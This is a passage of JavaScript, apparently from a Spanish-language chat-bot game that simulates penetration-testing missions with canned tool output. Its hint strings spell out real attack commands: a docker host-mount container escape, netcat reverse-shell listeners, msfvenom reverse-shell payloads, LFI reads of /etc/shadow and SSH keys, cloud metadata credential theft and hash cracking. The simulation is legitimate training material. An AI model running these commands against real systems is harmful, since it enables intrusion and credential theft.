      out = `Starting enum4linux v0.9.1 on ${mission.ip}\n${'─'.repeat(40)}\n`;
      out += `[*] Workgroup/Domain: HTB\n[*] OS: Windows Server 2016\n`;
      out += `[+] Users via RPC:\nindex: 0x1 RID: 0x1f4 user: Administrator\n`;
      out += `index: 0x2 RID: 0x3e8 user: ${mission.user}\n`;
      out += `[+] Share enumeration:\nShares: IPC$ ADMIN$ shares$ backup\n`;
      out += `[+] Password policy: min length 0, complexity disabled\n`;
    } else if (command === 'smbclient') {
      out = `Sharename       Type      Comment\n${'─'.repeat(45)}\nIPC$            IPC       IPC\nADMIN$          Disk      Admin\nshares$         Disk      Shared\nbackup          Disk      Backup files ← interesante\n`;
      out += `\n[+] Acceso anónimo: smbclient \\\\${mission.ip}\\backup -N\ndir:\n  credentials.txt  (${mission.userPass.length * 8} bytes)\n  notes.txt`;
    } else if (command === 'bloodhound') {
      if (t !== 'ad' && t !== 'apt') return `❌ BloodHound requiere un dominio AD activo.`;
      out = `BloodHound CE — Ingestor iniciado\n${'─'.repeat(40)}\n`;
      out += `[+] Recopilando datos: Sessions, ACLs, ObjectProps, LocalAdmin\n`;
      out += `[+] Usuarios encontrados: ${mission.user}, Administrator, krbtgt, svc_mssql\n`;
      out += `[+] Path to DA encontrado:\n    ${mission.user} → GenericWrite → svc_mssql → HasSession → DC01\n`;
      out += `[+] Kerberoastable accounts: svc_mssql (SPN: MSSQLSvc/db01.htb.local)\n`;
      out += `[+] AS-REP Roastable: ${mission.user} (no preauth required)\n`;
    } else if (command === 'kerbrute') {
      out = `kerbrute userenum --dc ${mission.ip} -d htb.local wordlist.txt\n${'─'.repeat(40)}\n`;
      out += `[+] VALID USERNAME: ${mission.user}@htb.local\n[+] VALID USERNAME: Administrator@htb.local\n`;
    } else if (command === 'crackmapexec' || command === 'cme') {
      out = `SMB  ${mission.ip}  445  DC01  [*] Windows Server 2016 x64 (name:DC01) (domain:htb.local)\n`;
      out += `SMB  ${mission.ip}  445  DC01  [+] ${mission.user}:${mission.userPass} (Pwn3d!)\n`;
      mission.state.foundCreds = true;
    } else {
      out = `ldapsearch output — DN: CN=${mission.user},CN=Users,DC=htb,DC=local\nsAMAccountName: ${mission.user}\nmemberOf: CN=Remote Management Users\n`;
    }

    return `📋 ${command.toUpperCase()} — Simulación:\n${'─'.repeat(40)}\n${out}\n${'─'.repeat(40)}\n✅ Siguiente: busca credenciales o lanza ataque específico`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 4. ENUMERACIÓN FTP
  // ══════════════════════════════════════════════════════════════════════

  if (command === 'ftp') {
    if (!mission.state.nmap) return `❌ Primero haz reconocimiento → nmap ${mission.ip}`;
    if (t !== 'ftp') return `❌ Puerto FTP (21) no está abierto en esta máquina.`;

    mission.state.enum = true;
    const isAnon = parts.some(p => p.includes('anonymous') || p.includes(mission.ip));
    if (!isAnon) return `ftp> open ${mission.ip}\n230 Login successful.\nftp> `;

    mission.state.foundCreds = true;
    return `ftp ${mission.ip}\nConnected to ${mission.ip}.\n220 vsftpd 3.0.3\nName: anonymous\nPassword: (enter)\n230 Login successful.\n\nftp> ls\n-rw-r--r--  credentials.txt\n-rw-r--r--  notes.txt\n-rw-r--r--  backup.zip\n\nftp> get credentials.txt\nTransferring...\n\n📄 credentials.txt:\nuser: ${mission.user}\npass: ${mission.userPass}\n\n🔑 ¡Credenciales obtenidas! ${mission.user}:${mission.userPass}`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 5. HERRAMIENTAS DE ATAQUE: hydra, sqlmap, wpscan, searchsploit, curl
  // ══════════════════════════════════════════════════════════════════════

  if (command === 'hydra' || command === 'medusa' || command === 'ncrack') {
    if (!mission.state.nmap) return `❌ Primero haz reconocimiento → nmap ${mission.ip}`;
    if (!mission.state.enum && t !== 'ssh') return `⚠️ Enumera primero para obtener un usuario válido.`;

    // Validación de argumentos
    const hasUser = parts.some(p => p === '-l' || p === '-L' || p.includes(mission.user) || p.includes('admin'));
    const hasWordlist = parts.some(p => p.includes('rockyou') || p.includes('.txt') || p === '-P' || p === '-p');
    const hasTarget = parts.some(p => p.includes(mission.ip) || p.includes('ssh://') || p.includes('ftp://'));
    if (!hasTarget) return `❌ Hydra: especifica el objetivo.\nEjemplo: hydra -l ${mission.user} -P /usr/share/wordlists/rockyou.txt ssh://${mission.ip}`;
    if (!hasUser)   return `❌ Hydra: especifica usuario con -l <user> o -L <file>\nUsuario enumerado: ${mission.user}`;
    if (!hasWordlist) return `❌ Hydra: especifica wordlist con -P /usr/share/wordlists/rockyou.txt`;

    if (!['ssh','ftp','smb','wordpress'].includes(t))
      return `❌ Hydra: no hay servicio bruteforceable en este vector. Este tipo (${t}) requiere otro enfoque.`;

    const proto = t === 'ftp' ? 'ftp' : t === 'wordpress' ? 'http-post-form' : 'ssh';
    const port  = t === 'ftp' ? '21' : t === 'smb' ? '445' : '22';

    // Simulación de intentos fallidos antes del éxito
    const fakeAttempts = [
      `[${port}][${proto}] host: ${mission.ip}  login: ${mission.user}  password: password  [FAIL]`,
      `[${port}][${proto}] host: ${mission.ip}  login: ${mission.user}  password: 123456   [FAIL]`,
      `[${port}][${proto}] host: ${mission.ip}  login: ${mission.user}  password: admin    [FAIL]`,
      `[${port}][${proto}] host: ${mission.ip}  login: ${mission.user}  password: letmein  [FAIL]`,
      `[${port}][${proto}] host: ${mission.ip}  login: ${mission.user}  password: welcome  [FAIL]`,
    ];

    mission.state.foundCreds = true;
    const attemptsBlock = fakeAttempts.slice(0, 3 + (mission.id % 3)).join('\n');
    return `🔓 ${command.toUpperCase()} v9.5 — bruteforce ${proto}://${mission.ip}\n${'─'.repeat(45)}\n[DATA] max 16 tasks per 1 server\n[DATA] attacking ${proto}://${mission.ip}:${port}/\n[DATA] wordlist: rockyou.txt (14,341,564 words)\n${'─'.repeat(45)}\n${attemptsBlock}\n...\n[${port}][${proto}] host: ${mission.ip}  login: ${mission.user}  password: ${mission.userPass}  ✅\n${'─'.repeat(45)}\n1 of 1 target successfully completed, 1 valid password found\n🔑 ¡Credenciales encontradas!  ${mission.user}:${mission.userPass}\n✅ Siguiente: ssh ${mission.user}@${mission.ip}`;
  }

  if (command === 'sqlmap') {
    if (!mission.state.nmap) return `❌ Primero haz reconocimiento.`;
    if (t !== 'sqli' && t !== 'fullchain') return `❌ sqlmap: no hay inyección SQL en este vector (${t}).`;

    mission.state.enum = true;
    const hasUrl = parts.some(p => p.includes('http') || p.includes(mission.ip) || p.includes('.php'));
    if (!hasUrl) return `❌ Uso: sqlmap -u "http://${mission.ip}/search.php?q=1" --dbs`;

    mission.state.foundCreds = true;
    return `sqlmap v1.7.2 — SQLi automatizado\n${'─'.repeat(40)}\n[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'\n[INFO] GET parameter 'q' is 'UNION query (NULL)' injectable\n[+] Bases de datos:\n    information_schema\n    htb_app\n[+] Tablas en htb_app: users, posts, config\n[+] Volcando tabla users:\n    id | username    | password\n    1  | admin       | ${mission.userPass} (plaintext)\n    2  | ${mission.user} | ${mission.userPass}\n[+] OS shell: bash obtenida via INTO OUTFILE\n${'─'.repeat(40)}\n🔑 Credenciales: ${mission.user}:${mission.userPass}\n✅ Siguiente: ssh ${mission.user}@${mission.ip} o usa la web shell`;
  }

  if (command === 'wpscan') {
    if (!mission.state.nmap) return `❌ Primero haz reconocimiento.`;
    if (t !== 'wordpress') return `❌ wpscan: WordPress no está instalado en esta máquina (tipo: ${t}).`;

    mission.state.enum = true;
    const hasBrute = parts.includes('--passwords') || parts.includes('-P') || parts.includes('--usernames');
    if (hasBrute) {
      mission.state.foundCreds = true;
      return `WPScan v3.8.24 — WordPress Security Scanner\n${'─'.repeat(40)}\n[+] WordPress 5.8.1\n[+] Plugin vulnerable: wp-file-manager 6.0 → ${cveMap.wordpress}\n[+] Brute-force usuarios:\n    admin:admin123 ❌\n    ${mission.user}:${mission.userPass} ✅\n${'─'.repeat(40)}\n🔑 Login: ${mission.user}:${mission.userPass}\n✅ Siguiente: accede /wp-admin y sube shell via Editor de temas`;
    }
    return `WPScan v3.8.24\n${'─'.repeat(40)}\n[+] URL: http://${mission.ip}/\n[+] WordPress versión 5.8.1 (desactualizada)\n[+] Plugins:\n    wp-file-manager 6.0 ← VULNERABLE (${cveMap.wordpress})\n[+] Usuarios enumerados: ${mission.user}, admin\n${'─'.repeat(40)}\n💡 Tip: añade --passwords /usr/share/wordlists/rockyou.txt --usernames ${mission.user} para bruteforce`;
  }

  if (command === 'searchsploit') {
    if (!mission.state.nmap) return `❌ Primero haz reconocimiento.`;
    const queries = parts.slice(1).join(' ');
    const exploitDB = {
      ssh:       'OpenSSH 7.6 — Username Enumeration (CVE-2018-15473)',
      web:       'Apache 2.4.41 — Path Traversal (CVE-2021-41773) | Apache 2.4.29 — mod_cgi RCE',
      ftp:       'vsftpd 3.0.3 — No known exploits (check anonymous auth)',
      smb:       'Windows — EternalBlue MS17-010 (CVE-2017-0144) [Metasploit: exploit/windows/smb/ms17_010_eternalblue]',
      wordpress: 'WordPress Plugin wp-file-manager 6.0 — Unauthenticated RCE (CVE-2020-25213)',
      sqli:      'MySQL 5.7 — UDF privilege escalation | PHP 7.4 — type juggling bypass',
      ad:        'Kerberoasting — impacket-GetUserSPNs | AS-REP Roasting — impacket-GetNPUsers',
      docker:    'Docker API unauthenticated — Container escape (no CVE — misconfig)',
      api:       'Spring Framework 5.3.x — Spring4Shell RCE (CVE-2022-22965)',
      cloud:     'AWS IMDSv1 SSRF — credenciales IAM via 169.254.169.254/latest/meta-data',
      kernel:    'Linux Kernel 5.8 — DirtyPipe (CVE-2022-0847) | Kernel 4.4 — DirtyCOW (CVE-2016-5195)',
      binary:    'Custom binary :1337 — Stack Buffer Overflow + ret2libc',
      crypto:    'AES-ECB padding oracle | RSA small exponent attack',
      fullchain: 'Redis 6.2 — SSRF RCE | Docker socket abuse',
      apt:       'DNS-over-HTTPS C2 bypass | Scheduled Task / Cron persistence'
    };
    return `🔍 Searchsploit — ExploitDB (${queries || mission.name}):\n${'─'.repeat(40)}\n${exploitDB[t] || 'No exploits directos encontrados. Busca manualmente.'}\n${'─'.repeat(40)}\n💡 Para metasploit: msfconsole`;
  }

  if (command === 'curl' || command === 'wget') {
    if (!mission.state.nmap) return `❌ Primero enumera el objetivo.`;
    const url = parts[1] || `http://${mission.ip}`;

    // LFI simulation
    if (url.includes('/../') || url.includes('..%2F') || url.includes('file=') || url.includes('path=')) {
      if (t !== 'web' && t !== 'ftp') return `❌ LFI: esta máquina (${t}) no tiene ese vector.`;
      mission.state.foundCreds = true;
      return `${command} "${url}"\n${'─'.repeat(40)}\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:\n${mission.user}:x:1000:1000::/home/${mission.user}:/bin/bash\n${'─'.repeat(40)}\n🔑 /etc/passwd leído via LFI! Prueba: ?file=../../../../etc/shadow\n✅ Siguiente: lee /etc/shadow o /home/${mission.user}/.ssh/id_rsa`;
    }
    // AWS metadata
    if (url.includes('169.254.169.254') || url.includes('metadata')) {
      if (t !== 'cloud') return `❌ No hay metadata endpoint en este tipo de máquina.`;
      mission.state.foundCreds = true;
      return `${command} "${url}"\n${'─'.repeat(40)}\n{"Code":"Success","AccessKeyId":"AKIA${mission.name.toUpperCase()}","SecretAccessKey":"${mission.rootPass.slice(0,16)}+XYZ","Token":"token-value","Expiration":"2099-01-01"}\n${'─'.repeat(40)}\n🔑 ¡Credenciales IAM obtenidas!\n✅ aws configure → aws s3 ls o aws iam list-users`;
    }
    // API token/info leak
    if (url.includes('/api') && (t === 'api' || t === 'fullchain')) {
      mission.state.enum = true;
      return `${command} "${url}"\n${'─'.repeat(40)}\nHTTP/1.1 200 OK\n{"version":"2.0","endpoints":["/users","/admin","/run","/login"],"auth":"JWT Bearer"}\n${'─'.repeat(40)}\n💡 Tip: prueba /api/v1/login con creds débiles, luego /api/v1/admin con JWT modificado`;
    }

    mission.state.enum = true;
    return `${command} "http://${mission.ip}"\n${'─'.repeat(40)}\nHTTP/1.1 200 OK\nServer: Apache/2.4.41\nContent-Length: 1337\n\n<html><!-- TODO: remove /backup/credentials.txt -->\n${'─'.repeat(40)}\n💡 Tip: gobuster o ffuf para descubrir rutas ocultas`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 6. METASPLOIT — mini estado de sesión MSF
  // ══════════════════════════════════════════════════════════════════════

  if (command === 'msfconsole' || command === 'msf' || command === 'metasploit') {
    msfSessions.set(chatId, { active: true, module: null, opts: {} });
    return `\n       =[ metasploit v6.3.25-dev ]\n+ -- --=[ 2373 exploits | 1232 auxiliary ]\n+ -- --=[ 959 payloads | 45 encoders ]\n${'─'.repeat(40)}\nmsf6 > \n💡 Comandos: use <módulo>, set RHOSTS, set LHOST, run/exploit\n   search ${mission.type} → encuentra módulos relevantes`;
  }

  if (command === 'search' && msfSessions.get(chatId)?.active) {
    const moduleMap = {
      smb:       'exploit/windows/smb/ms17_010_eternalblue  (excellent)',
      wordpress: 'exploit/multi/http/wp_file_manager_rce     (excellent)',
      api:       'exploit/multi/http/spring4shell_rce          (excellent)',
      docker:    'exploit/linux/http/docker_api_unauthenticated (great)',
      ftp:       'auxiliary/scanner/ftp/ftp_login              (normal)',
      ssh:       'auxiliary/scanner/ssh/ssh_login              (normal)',
      sqli:      'exploit/multi/http/php_sqli_rce              (great)',
      kernel:    'post/multi/manage/shell_to_meterpreter       (normal)',
      ad:        'auxiliary/gather/get_user_spns               (normal)',
    };
    const mod = moduleMap[t] || `exploit/multi/handler  (normal)`;
    return `msf6 > search ${parts.slice(1).join(' ')}\n${'─'.repeat(40)}\n#  Name                                Rank\n-  ----                                ----\n0  ${mod}\n${'─'.repeat(40)}\n💡 Usa: use 0  (o usa el path completo)`;
  }

  if (command === 'use' && msfSessions.get(chatId)?.active) {
    const msf = msfSessions.get(chatId);
    msf.module = parts.slice(1).join(' ') || 'exploit/multi/handler';
    return `msf6 exploit(${msf.module}) > \n[*] Módulo cargado: ${msf.module}\n💡 set RHOSTS ${mission.ip} | set LHOST <tu-ip> | run`;
  }

  if (command === 'set' && msfSessions.get(chatId)?.active) {
    const msf = msfSessions.get(chatId);
    msf.opts[parts[1]] = parts[2];
    return `msf6 > ${parts[1]} => ${parts[2]}`;  // set MSF option
  }

  if ((command === 'run' || command === 'exploit') && msfSessions.get(chatId)?.active) {
    const msf = msfSessions.get(chatId);
    if (!msf.module) return `msf6 > ❌ No has seleccionado un módulo. Usa: use <módulo>`;
    if (!msf.opts['RHOSTS'] && !msf.opts['rhost']) return `msf6 > ❌ Falta RHOSTS. Usa: set RHOSTS ${mission.ip}`;

    mission.state.foundCreds = true;
    mission.state.ssh = true;

    let shellOutput = `[*] Started reverse TCP handler\n[*] ${mission.ip}:${mission.ports.split(',')[0]} - Sending exploit...\n`;
    if (t === 'smb')       shellOutput += `[+] ${mission.ip}:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] EternalBlue overwrite completed!\n[+] ETERNALBLUE LOGLEVEL =:\n[+] Sending payload...\n`;
    if (t === 'wordpress') shellOutput += `[+] Uploading malicious file via wp-file-manager...\n[+] Shell uploaded: /var/www/html/wp-content/uploads/shell.php\n`;
    if (t === 'api')       shellOutput += `[+] Spring4Shell: binding ClassLoader via DataBinder...\n[+] Tomcat log poisoning → RCE confirmed\n`;

    shellOutput += `[*] Meterpreter session 1 opened (${msf.opts['LHOST'] || '10.10.14.1'}:4444 → ${mission.ip}:${mission.ports.split(',')[0]})\n\nmeterpreter > sysinfo\nComputer: ${mission.name.toUpperCase()}\nOS: ${mission.category === 'Windows' ? 'Windows Server 2016 (build 14393)' : 'Linux 5.4.0-74-generic'}\nUser: ${mission.user}\n\n✅ ¡Sesión Meterpreter activa!\n💡 Usa: shell → cat /home/${mission.user}/user.txt`;

    return `msf6 exploit(${msf.module}) >\n${'─'.repeat(40)}\n${shellOutput}\n${'─'.repeat(40)}`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 7. HERRAMIENTAS ESPECÍFICAS ADICIONALES
  // ══════════════════════════════════════════════════════════════════════

  // Docker escape
  if (command === 'docker') {
    if (!mission.state.nmap) return `❌ Primero haz reconocimiento.`;
    if (t !== 'docker' && t !== 'fullchain') return `❌ Docker no está expuesto en esta máquina.`;

    const sub = parts[1];
    mission.state.enum = true;

    if (sub === 'ps' || sub === 'images') {
      return `docker -H tcp://${mission.ip}:2375 ${parts.slice(1).join(' ')}\n${'─'.repeat(40)}\n${sub === 'ps' ?
        'CONTAINER ID   IMAGE          STATUS      NAMES\na1b2c3d4e5f6   ubuntu:20.04   Up 3 hours  webapp\n7f8e9d0c1b2a   alpine:3.14    Up 2 days   monitor' :
        'REPOSITORY     TAG      IMAGE ID       SIZE\nubuntu         20.04    1318b700e415   72.8MB\nalpine         3.14     e66264b98777   5.59MB'}\n${'─'.repeat(40)}\n💡 Monta el sistema de archivos del host: docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh`;
    }
    if (sub === 'run' && (trimmed.includes('/mnt') || trimmed.includes('chroot') || trimmed.includes('/host'))) {
      mission.state.ssh = true;
      mission.state.privesc = true;
      return `docker -H tcp://${mission.ip}:2375 run -v /:/mnt --rm -it ubuntu chroot /mnt sh\n${'─'.repeat(40)}\n# whoami\nroot\n# hostname\n${mission.name}\n# cat /root/root.txt → disponible con: cat /root/root.txt\n${'─'.repeat(40)}\n👑 Container escape exitoso → shell como root en el HOST\n🚩 cat /root/root.txt para el flag final`;
    }
    return `docker -H tcp://${mission.ip}:2375 ${parts.slice(1).join(' ')}\n${'─'.repeat(40)}\nError: comando incompleto. Intenta: docker -H tcp://${mission.ip}:2375 ps`;
  }

  // Impacket tools (AD)
  if (command.startsWith('impacket') || command === 'getuserspns.py' || command === 'getnpusers.py' ||
      command === 'psexec.py' || command === 'secretsdump.py' || command === 'wmiexec.py') {
    if (!mission.state.nmap) return `❌ Primero haz reconocimiento.`;
    if (!['ad','smb','apt','fullchain'].includes(t)) return `❌ Impacket: requiere AD/SMB activo (tipo actual: ${t}).`;

    mission.state.enum = true;
    if (command.includes('GetUserSPNs') || command === 'getuserspns.py') {
      mission.state.foundCreds = true;
      return `impacket-GetUserSPNs htb.local/${mission.user}:${mission.userPass} -dc-ip ${mission.ip} -request\n${'─'.repeat(40)}\n[*] Getting TGS for users...\nServicePrincipalName           Name       Password  Delegation\n-----------------------------  ---------  --------  ----------\nMSSQLSvc/db01.htb.local:1433   svc_mssql  False     None\n\n[*] TGS hash para crack:\n$krb5tgs$23$*svc_mssql$HTB.LOCAL*$...$(hash)\n${'─'.repeat(40)}\n💡 Crackea con: hashcat -m 13100 hash.txt rockyou.txt\n    o: john --wordlist=rockyou.txt hash.txt`;
    }
    if (command.includes('secretsdump') || command === 'secretsdump.py') {
      mission.state.privesc = true;
      return `impacket-secretsdump htb.local/Administrator:${mission.rootPass}@${mission.ip}\n${'─'.repeat(40)}\n[*] Dumping local SAM hashes...\nAdministrator:500:aad3b435...:${mission.rootPass.split('').map(() => Math.floor(Math.random()*16).toString(16)).join('')}:::\n${mission.user}:1000:aad3b435...:${mission.userPass.split('').map(() => Math.floor(Math.random()*16).toString(16)).join('')}:::\n[*] Dumping Domain Credentials via DRSUAPI\nkrbtgt:502:aad3b435...:KRBTGT_HASH:::\n${'─'.repeat(40)}\n👑 Domain dump completo — Golden Ticket posible`;
    }
    mission.state.ssh = true;
    return `impacket-psexec htb.local/${mission.user}:${mission.userPass}@${mission.ip}\n${'─'.repeat(40)}\n[*] Requesting shares on ${mission.ip}.....\n[*] Uploading service payload to ADMIN$\n[*] Opening SVCManager on ${mission.ip}.....\n[+] Creating service... starting service...\n[!] Press help for extra shell commands\nC:\\Windows\\system32> whoami\nnt authority\\system\n${'─'.repeat(40)}\n👑 Shell como SYSTEM obtenida! → cat /users/administrator/desktop/root.txt`;
  }

  // Hashcat / John (crackeo de hashes)
  if (command === 'hashcat' || command === 'john') {
    if (!mission.state.foundCreds && !mission.state.enum)
      return `❌ Primero obtén un hash o credencial que crackear.`;
    const hashTypes = { ad: 'Kerberos TGS hash crackeado', smb: 'NTLM hash crackeado', web: 'MD5 hash crackeado', sqli: 'plaintext en DB' };
    return `${command} — Cracking...\n${'─'.repeat(40)}\n[*] Wordlist: rockyou.txt (14.3M palabras)\n...\nCracked: ${hashTypes[t] || 'hash crackeado'}\n→ Password: ${mission.userPass}\n${'─'.repeat(40)}\n🔑 Credencial: ${mission.user}:${mission.userPass}`;
  }

  // Netcat
  if (command === 'nc' || command === 'netcat' || command === 'ncat') {
    if (!mission.state.nmap) return `❌ Haz reconocimiento primero.`;
    const isListen = parts.includes('-l') || parts.includes('-lvp') || parts.includes('-lvnp');
    const hasPort = parts.some(p => /^\d{4,5}$/.test(p));
    if (isListen && hasPort) {
      return `nc -lvnp ${parts.find(p => /^\d{4,5}$/.test(p))}\nListening on 0.0.0.0:${parts.find(p => /^\d{4,5}$/.test(p))}\n\n[Conexión recibida de ${mission.ip}]\nbash: no job control in this shell\n${mission.user}@${mission.name}:~$ \n✅ Reverse shell recibida! Ahora estabiliza: python3 -c 'import pty;pty.spawn("/bin/bash")'`;
    }
    if (t === 'binary' && parts.includes(mission.ip)) {
      return `nc ${mission.ip} 1337\nConnected to custom binary service.\nWelcome to ${mission.name} challenge!\nEnter your name: \n💡 Tip: analiza el binario con gdb/ghidra — buffer overflow en input`;
    }
    return `nc ${mission.ip} ${parts.find(p => /^\d{3,5}$/.test(p)) || '80'}\n${'─'.repeat(40)}\nConexión establecida. Envía payload manualmente.`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 8. LECTURA DE ARCHIVOS (post-enum / post-shell)
  // ══════════════════════════════════════════════════════════════════════

  if (['cat', 'type', 'less', 'more', 'head', 'tail'].includes(command)) {
    const file = parts.slice(1).join(' ') || '';

    // ── VFS: lee archivos escritos por el jugador con echo ──────────────
    if (session.vfs[file]) {
      return `${file}:\n${'─'.repeat(30)}\n${session.vfs[file]}`;
    }

    // ── RABBIT HOLE: archivo trampa con creds falsas ─────────────────────
    if (mission.rabbitHole && file.includes(mission.rabbitHole.file)) {
      mission.rabbitHole.triggered = true;
      return `📄 ${file}:\n${'─'.repeat(40)}\n# Backup antiguo — puede estar desactualizado\nusername: ${mission.user}\npassword: ${mission.rabbitHole.fakePass}\n# nota: credenciales de staging, no producción\n${'─'.repeat(40)}\n⚠️  Archivo encontrado. ¿Serán las credenciales correctas?`;
    }

    // ── SSH FAIL si intentan conectar con creds del rabbit hole ──────────
    // (el check se hace en el bloque ssh más abajo)

    // Credenciales en archivos conocidos
    const credFiles = ['credentials.txt','secret.txt','notes.txt','config.php','wp-config.php',
                       '.htpasswd','users.txt','password.txt','db.php','settings.py','.env',
                       'config.json','secrets.yaml','id_rsa','backup.sql','web.config'];
    if (credFiles.some(f => file.includes(f))) {
      if (!mission.state.nmap) return `❌ Primero reconoce el objetivo.`;
      mission.state.foundCreds = true;
      const fileContent = file.includes('id_rsa') ?
        `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA...(${mission.user} RSA key)\n-----END OPENSSH PRIVATE KEY-----\n🔑 ¡Clave SSH privada encontrada! chmod 600 id_rsa && ssh -i id_rsa ${mission.user}@${mission.ip}` :
        `# ${file}\nuser="${mission.user}"\npassword="${mission.userPass}"\ndatabase="htb_db"\n# TODO: mover a vault\n\n🔑 ¡Credenciales encontradas! ${mission.user}:${mission.userPass}`;
      return `📄 Archivo: ${file}\n${'─'.repeat(40)}\n${fileContent}`;
    }

    // /etc/passwd
    if (file.includes('/etc/passwd')) {
      if (!mission.state.ssh) return `❌ Permiso denegado. Obtén shell primero.`;
      return `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:\nwww-data:x:33:33:\n${mission.user}:x:1000:1000::/home/${mission.user}:/bin/bash\n\n💡 Usuarios interesantes: root, ${mission.user}`;
    }

    // /etc/cron* (privesc path)
    if (file.includes('cron') || file.includes('/etc/cron')) {
      if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
      return `cat ${file}\n${'─'.repeat(40)}\n*/5 * * * * root /opt/scripts/backup.sh\n@reboot root /opt/scripts/monitor.py\n${'─'.repeat(40)}\n💡 /opt/scripts/backup.sh ← ¿tienes escritura? ls -la /opt/scripts/backup.sh`;
    }

    // uname / /proc/version (kernel info para privesc)
    if (file.includes('/proc/version') || file.includes('kernel')) {
      if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
      const kernelVer = t === 'kernel' ? '4.4.0-92-generic #115-Ubuntu' : '5.4.0-74-generic #83-Ubuntu';
      return `Linux version ${kernelVer}\n💡 Kernel ${t === 'kernel' ? '4.4 — vulnerable a DirtyCOW (CVE-2016-5195)' : '5.4 — revisa sudo -l'}`;
    }

    // User flag
    if (file.includes('user.txt') || file.includes('local.txt')) {
      if (!mission.state.ssh) return `❌ Permiso denegado. Obtén shell remoto primero.`;
      mission.state.userFlag = true;
      return `🚩 USER FLAG:\n${mission.userFlag}\n\n✅ ¡User flag capturado! Siguiente: escalada de privilegios\n💡 sudo -l | linpeas | find / -perm -4000 | crontab -l`;
    }

    // Root flag
    if (file.includes('root.txt') || file.includes('proof.txt') || file.includes('root_flag')) {
      if (!mission.state.ssh) return `❌ No tienes shell remoto.`;
      if (!mission.state.privesc) return `❌ Acceso denegado. Necesitas privilegios root.\n💡 Usa: sudo -l, linpeas, find / -perm -4000 -2>/dev/null`;
      mission.state.rootFlag = true;
      return `👑 ROOT FLAG:\n${mission.rootFlag}\n\n🎉 ¡Máquina ${mission.name} completamente comprometida!\n✅ Misión completada — usa !htb status para ver tu progreso`;
    }

    return `❌ cat: ${file || '(sin archivo)'}: No such file or directory.\n💡 Archivos que puedes leer según el contexto:\n   - /home/${mission.user}/user.txt (tras obtener shell)\n   - /root/root.txt (tras privesc)\n   - config.php, .env, credentials.txt (tras enumerar web)`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 9. CONEXIÓN REMOTA — ssh, evil-winrm, psexec, msfvenom
  // ══════════════════════════════════════════════════════════════════════

  if (['ssh', 'evil-winrm', 'psexec', 'wmiexec', 'smbexec'].includes(command)) {
    if (!mission.state.nmap) return `❌ Haz reconocimiento primero.`;

    // Detectar si el jugador usa las creds falsas del rabbit hole
    const usedFakeCreds = mission.rabbitHole?.triggered && !mission.state.foundCreds &&
      (trimmed.includes(mission.rabbitHole.fakePass) || 
       (parts.some(p => p.includes('@')) && !mission.state.foundCreds));
    if (usedFakeCreds) {
      return `ssh: connect to host ${mission.ip} port 22: Connection established\n${mission.user}@${mission.ip}: Permission denied (publickey,password).\n\n🔒 Autenticación fallida. Las credenciales de ${mission.rabbitHole.file} no funcionan.\n💡 Busca las credenciales reales — ese archivo era un backup antiguo.`;
    }

    if (!mission.state.foundCreds) return `❌ No tienes credenciales. Enumera y busca archivos primero.\n💡 Tip: ${t === 'ftp' ? 'ftp anonymous@' + mission.ip : t === 'sqli' ? 'sqlmap' : t === 'wordpress' ? 'wpscan --passwords rockyou.txt' : 'cat config.php o usa hydra'}`;

    mission.state.ssh = true;
    const isWin = mission.category === 'Windows';
    const shell = isWin ? 'C:\\Windows\\system32' : `/home/${mission.user}`;
    const prompt = isWin ? `${mission.user}@${mission.name} ${shell}>` : `${mission.user}@${mission.name.toLowerCase()}:~$`;

    const sshKey = parts.some(p => p === '-i');
    const authMethod = sshKey ? 'autenticación por clave privada' : `password: ${mission.userPass}`;

    return `💻 ${command.toUpperCase()} — Conexión exitosa (${authMethod})\n${'─'.repeat(40)}\n${prompt} whoami\n${mission.user}\n${prompt} id\n${isWin ? `${mission.user} (Domain Users, Remote Management Users)` : `uid=1000(${mission.user}) gid=1000(${mission.user})`}\n${prompt} hostname\n${mission.name}\n${'─'.repeat(40)}\n✅ Shell como ${mission.user}\n🚩 cat ${isWin ? `C:\\Users\\${mission.user}\\Desktop\\user.txt` : `/home/${mission.user}/user.txt`}\n⬆️ Privesc: ${isWin ? 'whoami /priv | Get-LocalGroup | winpeas' : 'sudo -l | linpeas | find / -perm -4000 -2>/dev/null'}`;
  }

  if (command === 'msfvenom') {
    return `msfvenom -p ${mission.category === 'Windows' ? 'windows/x64/shell_reverse_tcp' : 'linux/x64/shell_reverse_tcp'} LHOST=${parts.find(p => p.includes('LHOST='))?.split('=')[1] || '10.10.14.1'} LPORT=4444 -f ${mission.category === 'Windows' ? 'exe' : 'elf'} -o shell.${mission.category === 'Windows' ? 'exe' : 'elf'}\n${'─'.repeat(40)}\n[-] No platform was selected, choosing Msf::Module::Platform::${mission.category}\n[+] Payload size: 510 bytes\n[+] Final size: 510 bytes\n[*] Saved as: shell.${mission.category === 'Windows' ? 'exe' : 'elf'}\n💡 Sube el payload y ejecútalo. Escucha con: nc -lvnp 4444`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 10. ESCALADA DE PRIVILEGIOS
  // ══════════════════════════════════════════════════════════════════════

  if (trimmed === 'sudo -l' || trimmed === 'sudo -ll') {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    const sudoOptions = [
      `(ALL) NOPASSWD: /usr/bin/vim`,
      `(ALL) NOPASSWD: /usr/bin/python3`,
      `(ALL) NOPASSWD: /usr/bin/find`,
      `(ALL) NOPASSWD: /usr/bin/nmap`,
      `(ALL) NOPASSWD: /usr/bin/env`,
      `(ALL) NOPASSWD: /usr/bin/awk`,
      `(root) NOPASSWD: /opt/scripts/backup.sh`,
      `(ALL) NOPASSWD: /usr/bin/perl`
    ];
    const sudoOut = sudoOptions[mission.id % sudoOptions.length];
